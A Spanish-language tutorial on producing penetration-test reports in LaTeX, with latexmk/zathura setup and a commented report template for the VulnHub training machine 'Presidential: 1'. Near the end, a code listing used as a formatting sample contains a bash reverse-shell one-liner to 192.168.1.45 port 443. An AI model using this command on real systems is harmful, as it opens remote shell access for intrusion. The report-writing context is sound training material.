-------

Vamos a ver como se deben crear los informes en latex.

Usualmente tenemos dos tipos de Documentos los `Informes Técnicos` y los  `Informes Ejecutivos` 

Primero vamos a instalar las utilidades necesarias para generar estos informes:
```bash
sudo apt install latexmk zathura texlive-full texlive-base
```

Ahora vamos a ejecutar los siguientes comandos:
```bash
sudo xdg-mime query default application/pdf
```

```bash
sudo xdg-mime default zathura.desktop application/pdf
```

Ya con esto cualquier documento que abramos con `latexmk` se va a abrir con zathura.

Por último tanto en el directorio del usuario como en el root vamos a crear dentro del `.config` la carpeta `latexmk` y dentro el archivo `latexmkrc` con el contenido:
```
$pdf_previewe = "zathura";
```

Listo ya tenemos el entorno configurado.

En este punto vamos a practicar con la documentación de la maquina [[Presidential 1]] ya que vamos a detallar un informe para la misma.

## Notas de la Practica

Bueno comenzamos definiendo el formato de plantilla que vamos a utilizar:
```latex
\documentclass[a4paper]{article} % Formato de plantilla que vamso a utilizar

\usepackage[utf8]{inputenc} % Para poder utilizar caracteres especiales
\usepackage[spanish]{babel} % para poder utilizar caracteres especiales

```

Ahora la estructura general para un documento seria la siguiente:
```latex
\documentclass[a4paper]{article} % Formato de plantilla que vamso a utilizar

\usepackage[utf8]{inputenc} % Para poder utilizar caracteres especiales
\usepackage[spanish]{babel} % para poder utilizar caracteres especiales

\begin{document} % Inicio del Documento

Hola que tal probando

\end{document} % Fin del documento

```

Ya con esto primero definido vamos a salir y vamos a general un archivo PDF resultante con el siguiente comando:
```bash
latexmk -pdf Documento.tex
```

![[Pasted image 20250831185312.png]]

Nos genera como podemos ver el documento en PDF y podemos abrirlo con el lector de PDF que nosotros queramos.

Ahora esto no es muy practico ya que tendríamos que terminar de redactar todo el proyecto para luego poder generar el PDF por lo que vamos a modificar el comando de la siguiente manera:
```bash
 latexmk -pdf Documento.tex -pvc
```

![[Pasted image 20250831191254.png]]

Esto nos permite ver todo en tiempo real cada vez que guardemos el documento.

Ya con esto claro vamos a comenzar ahora si con la estructura del documento y todo el documento en este caso vamos a dejarlo comentado para que se pueda ver como debe de ser:
```latex
\documentclass[a4paper]{article}

\usepackage[utf8]{inputenc} % para poder utilizar caracteres especiales
\usepackage[spanish]{babel} % para poder utilizar caracteres especiales
\usepackage[margin=2cm, top=2cm, includefoot]{geometry} % para establecer los margenes del documento
\usepackage{graphicx} % para la inserción de imágenes
\usepackage[table,xcdraw]{xcolor} % para la representación de colores
\usepackage{tikz,lipsum,lmodern} % para la creación de cajas
\usepackage[most]{tcolorbox} % para la creacion de cajas
\usepackage{fancyhdr} % definir el estilo de la pagina
\usepackage[hidelinks]{hyperref} % para las referencias del indice
\usepackage{setspace} % para que nos de el espaciado entre lineas
\setstretch{1.2} % controla el espaciado entre lineas
\usepackage{parskip} % para arreglar el espacio blanco entre parrafos
\setlength{\parindent}{0pt}
\setlength{\parskip}{0.8em plus 0.5em minus 0.2em} % Establece el espacio entre parrafos de fuente
% de un em  mas 0.5 de espacioado extra permitido con uan reducción máxima de 0.2em
\setlength{\parfillskip}{\parindent plus 1fill}
\usepackage[figurename=Image]{caption} %importacion para cambiar el nombre de la imagen
\usepackage{ragged2e} % para jugar don justifying cuando terminal un centering
\usepackage{listings} % para la insersion de código

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},   
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2
}

\lstset{style=mystyle}

% declaración de variables personalizadas
\newcommand{\logoPortada}{./img/logoVulnHub.png}
\newcommand{\machineName}{Presidential: 1}
\newcommand{\logoMachine}{./img/Casa-Blanca.jpg}
\newcommand{\startDate}{31 de Agosto del 2025}
\newcommand{\logoAcademia}{./img/logoAcademia.png}
\newcommand{\logoVulnhubSimple}{./img/LogoVulhubMini.png}


%Adicionales
\addto\captionsspanish{\renewcommand{\contentsname}{Índice}}
\setlength{\headheight}{40.2pt}
\pagestyle{fancy}
\fancyhf{}
\lhead{\includegraphics[width=1.3cm]{\logoAcademia}}\rhead{\includegraphics[height=1.5cm]{\logoVulnhubSimple}}
\renewcommand{\headrulewidth}{3pt} % autmentar el tamaño de la barra
\renewcommand{\headrule}{\hbox to\headwidth{\color{bluePortada}\leaders\hrule height \headrulewidth\hfill}}
\renewcommand{\lstlistingname}{Código} % Cambiamos Lising por Código


% definicion de colores
\definecolor{bluePortada}{HTML}{146c8a}

\begin{document}
\cfoot{\thepage}
\begin{titlepage}
	\centering{
		\includegraphics[width=0.5\textwidth]{\logoPortada}\par\vspace{1cm}
		% tenemos dos opciones: textwidth y paperwidth donde:
		% textwidth se acopla al tamaño del texto.
		% en el caso de paper width jugamos con makebox para que se acople bien al tamaño del papel, ejemplo
		% \makebox[\textwidth]{\includegraphics[width=\paperwidth]{./img/logoVulnHub.png}}
		% el par\vspace{1cm} no spermite dar medidas especificas

		{\scshape\LARGE \textbf{Informe Técnico}}\par\vspace{0.4cm}
		% \schsape\LARGE nos permite poner el texto mas grande
		% \textbf{} nos permite hacer la fuente negrita

		{\Huge\textcolor{bluePortada}{\textbf{Máquina \machineName}}} % definiendo color al texto
		\vfill\vfill
		\includegraphics[width=\textwidth, height=10cm, keepaspectratio]{\logoMachine}
		\vfill
	}

	\begin{tcolorbox}[colback=red!5!white,colframe=red!75!black]
		\centering{
			Este documento es confidencial y contiene información sensible. \\ % los \\ es para salto de linea
			No debería ser impreso ni compartido con terceras entidades
		}
	\end{tcolorbox}
	\vfill
	{\large \startDate}
	\vfill
\end{titlepage}

% ---------------------------------------
% Comienzo del TOC
\clearpage
\tableofcontents
\clearpage
%-----------
\section{Antecedentes}

El presente documento recoge los resultados obtenidos durante la fase de auditoria realizada a la Máquina
\textbf{\machineName}, enumerado todos los vectores de ataque encontrados así como la explotación realizada
para cada uno de estos.

Esta máquina ha sido descargada de la plataforma de
\href{https://vulnhub.com}{\textbf{\color{bluePortada}Vulnhub}}, una plataforma
de entrenamiento y pŕactica para personas interesada en el hacking ético.

A continuación, se proporciona el enlace directo de descarga a esta máquina:

\vspace{0.2cm}

\begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
		colback=blue!5!white,colframe=blue!75!black,colbacktitle=bluePortada!80!black,
		title=Dirección URL,fonttitle=\bfseries,
		boxed title style={size=small,colframe=bluePortada!50!black} ]
	\centering{
		\href{https://www.vulnhub.com/entry/presidential-1,500/}{\textbf{\color{bluePortada}https://www.vulnhub.com/entry/presidential-1,500/}}
	}
\end{tcolorbox}

\vspace{0.5cm}

\begin{figure}[h] % forma correcta para incertar imagenes
	\centering{
		\setlength{\fboxrule}{0.8pt}
		\fbox{\includegraphics[width=\textwidth]{./img/presidential-img.png}}
		\caption{Página principal del servicio web de la máquina}
	}
\end{figure}

\section{Objetivos}
Los objetivos de la presente auditorioa de seguridad se enfocan en la
identificación de posibles vulnerabilidades y vulnerabilidades en la máquina
\textbf{\color{bluePortada}\machineName}, con el propósito de garantizar la
integridad y confidencialidad de la información almacenada en ella.

Con este fin, se ha llevado a cabo un análisis exhaustivo de todos los servicios
detectados que se encontraban expuestos en dicho servidor, recopilando
información detallada sobre aquellos pre representan un riesgo potencial desde
el punto de vista de la seguridad

\clearpage
\subsection{Alcance}

A continuacion se representan los objetivos a cumplir para esta auditoría:

\begin{itemize}
	\item Identificar los puertos y servicios vulnerablesl
	\item Realizar una explotación de las vulnerabilidades encontradas.
	\item Conseguir acceso al servidor mediante la explotación de los
	      servicios vulnerables identificados.
	\item Enumerar vías potenciales de levar privilegios en el sistema una vez
	      este ha sido vulnerado.

\end{itemize}

\subsection{Impedimentos y limitaciones}
Durante el proceso de auditorioa está terminantemente prohibido realizar alguna
de las siguiente actividades:

\begin{itemize}
	\item Realizar tareas que puedan ocasionar una \textbf{denegacion de servicio}
	      o afectar a la disponibilidad de los servicios expuestos
	\item Borrar archivos de residentes en el servidor una vez este haya sido
	      vulnerado
\end{itemize}

\subsection{Resumen general}
En el proceso de la auditoria se realizan varias faces las cuales constan de:

\begin{itemize}
	\item Reconocimiento
	\item Explotación
	\item Escalada de privilegios
\end{itemize}

Comenzamos en la face de Reconocimiento en la cual se realizo multiples tipos de
escaneo con el objetivo de obtener la mayor cantidad de infomación posible sobre
la victima, en este caso mediante herramientas como \textbf{Nmap, Whatweb,
	Wfuzz, Gobuster} logramos obtener la información suficiente para intentar
diferentes tipod de ataques.

En la Fase de Explotación es donde se intentan los diferentes tipos de ataques
como fuero: \textbf{LFI, XXS, SQLI, RCE} donde el objetivo es siempre obtener
acceso a la máquina mediante una conexión estable y un usuario cualquiera.

Por ultimo en la face de escalada de privilegios se realizo diferentes tipos de
escaneso los cuales nos permitieron enumerar: \textbf{Usuarios, Grupos,
	Servicios, Procesos, Puertos internos} mediante los cuales se realiza el intento
de una escalada de priviletios donde el objetivo siempre sera obtener acceso al
usuario con el mayor rango posible dentro del sistema.

\clearpage

\section{Reconocimiento}
\subsection{Enumeracion de servicios expuestos}

A continuación, se adjunta una evidencia de los puetos y servicios identificas
durante el reconocimiento aplicando con la herramienta \textbf{nmap}:

\begin{figure}[h] % forma correcta para incertar imagenes
	\centering
	\setlength{\fboxrule}{0.8pt}
	\fbox{\includegraphics[width=\textwidth]{./img/ScanNmapPorts.png}}
	\caption{Enumeración de puertos con Nmap}
\end{figure}
\vspace{0.3cm}
En este caso, se identificaron 2 puertos activos corriendo por el puerto TCP:

\vspace{0.5cm}

\centering
\begin{tikzpicture}[node distance=2cm, every node/.style={rectangle, draw,
				fill=white}]
	\node (center) {TCP}; % crando los nodos
	\node (port1) [below left of=center, node distance=3cm] {Puerto 80};
	\node (port2) [below right of=center, node distance=3cm] {Puerto 2082};
	\draw (center) -- (port1); % dibujando las lineas de los nodos
	\draw (center) -- (port2);
\end{tikzpicture}

\vspace{0.5cm}
\justifying % para quitar el \cetering

Asimismo, no se encontraron puertos expuestos a través de otros protocolos, por
l oque se priorizará la evaluación de los puertos identificados por el primer
escaneo efectuado.

\clearpage

\subsection{Enumeración de servidores web}

A continuació, se representa los resultados obteneidos con la herramienta
\textbf{WhatWeb}, una herramienta de reconocimiento web que se utiliza para
identificar tecnologías web específicas que se emplean en un sitio web, tras
aplicar un reconocimiento sobre el servicio HTTP corriendo por el puerto 80:


\begin{figure}[h] % forma correcta para incertar imagenes
	\centering
	\setlength{\fboxrule}{0.8pt}
	\fbox{\includegraphics[width=\textwidth]{./img/Whatweb.png}}
	\caption{Enumeración del servicio HTTP por el puerto 80}
\end{figure}

En los resultados obtenidos, es posible identificar las versiones para algunas
de las tecnologías existentes

\vspace{0.5cm}
% creando una tabla
\begin{center}
	\begin{tabular}{ c | c } % centered(c) una columnas | centered(c) otra columan
		\textbf{Tecnologías} & \textbf{Versión} \\
		\hline
		PHP                  & 5.5.38           \\
		Apache               & 2.4.6
	\end{tabular}
\end{center}
\vspace{0.4cm}

Dentro de la información representada tambien es posible identificar dos correos
electrónicos, los cuales pordrían ser utilizados de cara a un ataque de
\textbf{Phishing}

\vspace{0.3cm}

\begin{center}
	\texttt{contact@example.com} \qquad \texttt{contact@votenow.local}
\end{center}

\vspace{0.3cm}

El \textbf{Phishing} es un tipo de ataque informático que se utiliza para
engañar a las personas y obtener información confidencial, como contraseñas,
información bancaria o detalles de tarjetas de cŕedito. El ataque se lleva a
cabo mediante el envío de correos electrónicos fraudulenteos o mensajes de
texto que parecen legítimos y que solicitan al destinatario que proporcione
información personal o confidencial


%Insertanto código

\begin{lstlisting}[language=bash, caption=Scrtip en bash encargado de entablar la
conexión]
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.45/443 0>&1

\end{lstlisting}


\end{document}
```

y con esto tenemos un ejemplo de como se debe redactar un informe con latex.